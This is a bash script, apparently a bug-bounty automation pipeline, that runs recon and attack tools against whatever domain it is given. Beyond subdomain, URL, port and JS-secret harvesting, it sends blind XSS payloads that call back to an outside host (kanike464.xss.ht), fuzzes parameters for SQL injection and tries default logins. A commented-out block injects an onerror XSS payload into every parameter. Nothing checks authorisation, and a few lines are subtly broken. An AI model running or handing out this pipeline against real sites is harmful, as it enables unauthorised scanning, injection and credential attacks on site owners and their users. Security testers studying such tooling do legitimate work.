#!/bin/bash

Banner(){
cat << "EOF" 
            ____   _                   _                             
           / ___| | |__    __ _  _ __ (_) _ __    __ _   __ _  _ __  
           \___ \ | '_ \  / _` || '__|| || '_ \  / _` | / _` || '_ \ 
            ___) || | | || (_| || |   | || | | || (_| || (_| || | | |
           |____/ |_| |_| \__,_||_|   |_||_| |_| \__, | \__,_||_| |_|
                                                 |___/               
							@mohamedsayed   
EOF
}
Banner

mkdir $HOME/targets 2> /dev/null ; cd $HOME/targets

mkdir $1 2> /dev/null ; cd $1


sub_enum(){

    subenum -d $1  > /dev/null
    #subenum is a tool uses amass,assetfinder,subfinder,ctrsh,findomain,bufferover
    #https://github.com/bing0o/SubEnum
    mv *.txt ./domains
}
sub_enum $1


getting_hosts(){
	cat domains | httprobe -prefer-https -c 50 | anew hosts

}
getting_hosts


wayback_gau(){
	cat hosts | waybackurls | sort -u | anew urls
	cat hosts | gau | sort -u | anew urls
}
wayback_gau


custom_wordlist(){
	mkdir wordlist
	cat urls | unfurl -u paths  | sed 's#/#\n#g'| sort -u | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js|html)" | anew wordlist/paths_wlist
	cat urls | unfurl -u keys | sort -u | anew wordlist/params_wlist
	# use param miner ext in burp and feed this list to it
}
custom_wordlist


use_fff(){
	mkdir fff_results
	cat hosts | fff -o fff_results -S | tee -a fff_results/index.txt
	# tomnomnom: cat hosts | fff --save --delay 500
	# tomnomnom: comb hosts paths_wlist | fff --save
}
use_fff
# use grep -Hnri <something>
# H -> --with-filename, n -> --line-number , r -> --recursive, i -> --ignore-case

directory_bruteforcing() {
	cat fff_results/index.txt | grep -E "(403|401|301|302)$" | awk '{print $2 "/FUZZ"}' >> subs
	for sub in `cat subs`; do
		host=$(echo sub | awk -F "/" '{print $3}')
		ffuf -u $sub -w raft-large-files-lowercase.txt >> $host
	done

}

port_scanning(){
	naabu -rate 10000 -l domains -silent -o ports
}
port_scanning

#arjun -i <file> -w wordlist/params_wlist -d 2 --stable -oT res




cat urls | grep "pass\|edit\|token\|key\|username\|forgot\|reset" | uro | anew reset_password_test





wayback_data(){
	mkdir wayback_links_exts

	#js files
	cat urls | grep -P "\w+\.js(\?|$)" | sort -u | anew wayback_links_exts/jsurls.txt
	#js files
	hostname=$(echo $1 | awk -F "." '{print $1}')
	cat hosts | hakrawler | awk '{print $2}' |  grep $hostname | grep -E '\.js$' | sort -u | anew wayback_links_exts/jsurls.txt


	cat urls  | grep -P "\w+\.php(\?|$)" | sort -u  | tee -a wayback_links_exts/phpurls.txt

	cat urls  | grep -P "\w+\.aspx(\?|$)" | sort -u  | tee -a wayback_links_exts/aspxurls.txt

	cat urls  | grep -P "\w+\.jsp(\?|$)" | sort -u | tee -a wayback_links_exts/jspurls.txt

	cat urls  | grep -P "\w+\.txt(\?|$)" | sort -u  | tee -a wayback_links_exts/robots.txt
 
    
}
wayback_data $1


gf_patterns(){
	mkdir urls_perhaps_vuln

	cat urls | gf xss | uro | tee -a urls_perhaps_vuln/xss

	cat urls | gf lfi | uro | tee -a urls_perhaps_vuln/lfi

	cat urls | gf rce | uro | tee -a urls_perhaps_vuln/rce

	cat urls | gf redirect | uro | tee -a urls_perhaps_vuln/redirect

	cat urls | gf idor | uro | tee -a urls_perhaps_vuln/idor

	cat urls | gf sqli | uro | tee -a urls_perhaps_vuln/sqli

	cat urls | gf ssrf | uro | tee -a urls_perhaps_vuln/ssrf

}
gf_patterns

screenshots(){
	eyewitness --web -f hosts
}
screenshots

slurp_s3_buckets(){
	slurp domain -t $1
}
slurp_s3_buckets $1


js_analyzing(){
	
	js_links=$(cat urls | grep -P "\w+\.js(\?|$)" | sort -u)
	for link in $(cat $js_links); do
		secretfinder -i $link
	done
	
}
js_analyzing


#use JSScanner after modify the file path and regex path to give them as arguments using sys .. sys.argv[1], sys.argv[2]


<<c
silly_ref_xss(){
	mkdir silly_ref_xss
cat urls | grep "=" | egrep -iv ".(jpg|jprg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pfd|svg|txt|js)" | qsreplace "<img src='x' onerror='confirm(1)'>" | fff -o silly_ref_xss -S | tee -a silly_ref_xss/index.txt
}
silly_ref_xss
c





scanner(){
	mkdir scanner_nuclei

	nuclei -l urls -t /home/mohamed/.local/nuclei-templates/fuzzing/ -c 60 -o scanner_nuclei/fuzzing.txt
	nuclei -l urls -t /home/mohamed/.local/nuclei-templates/cves/ -c 60 -o scanner_nuclei/cves.txt
	nuclei -l urls -t /home/mohamed/.local/nuclei-templates/file/ -c 60 -o scanner_nuclei/files.txt
	nuclei -l urls -t /home/mohamed/.local/nuclei-templates/exposed-panels/ -c 60 -o scanner_nucleipanels.txt
	nuclei -l urls -t /home/mohamed/.local/nuclei-templates/misconfiguration/ -c 60 -o scanner_nuclei/misconfiguration.txt
	nuclei -l urls -t /home/mohamed/.local/nuclei-templates/technologies/ -c 60 -o scanner_nuclei/technologies.txt
	nuclei -l urls -t /home/mohamed/.local/nuclei-templates/takeovers/ -c 60 -o scanner_nuclei/tokens.txt
	nuclei -l urls -t /home/mohamed/.local/nuclei-templates/vulnerabilities/ -c 60 -o scanner_nuclei/vulnerabilities.txt
	nuclei -l urls -t /home/mohamed/.local/nuclei-templates/bugs-misconfigs/ -c 60 -o scanner_nuclei/bugs-misconfigs.txt
	nuclei -l urls -t /home/mohamed/.local/nuclei-templates/exposures/ -c 60 -o scanner_nuclei/exposures.txt
	nuclei -l urls -t /home/mohamed/.local/nuclei-templates/workflows/ -c 60 -o scanner_nuclei/workflow.txt
	nuclei -l urls -t /home/mohamed/.local/nuclei-templates/helpers/ -c 60 -o scanner_nucleihelpers.txt
	nuclei -l urls -t /home/mohamed/.local/nuclei-templates/default-logins/ -c 60 -o scanner_nuclei/default-logins.txt
}
scanner


gauq() {
	cat urls | grep "=" | egrep -iv ".(jpg|jprg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pfd|svg|txt|js)" | qsreplace -a
}
sqliz() {
	gauq | dsss | anew dsss_res
}
bxss() {
	BLIND="https://kanike464.xss.ht"
	cat urls | kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | dalfox pipe -b $BLIND | anew xss_res
}
bxss
sqliz

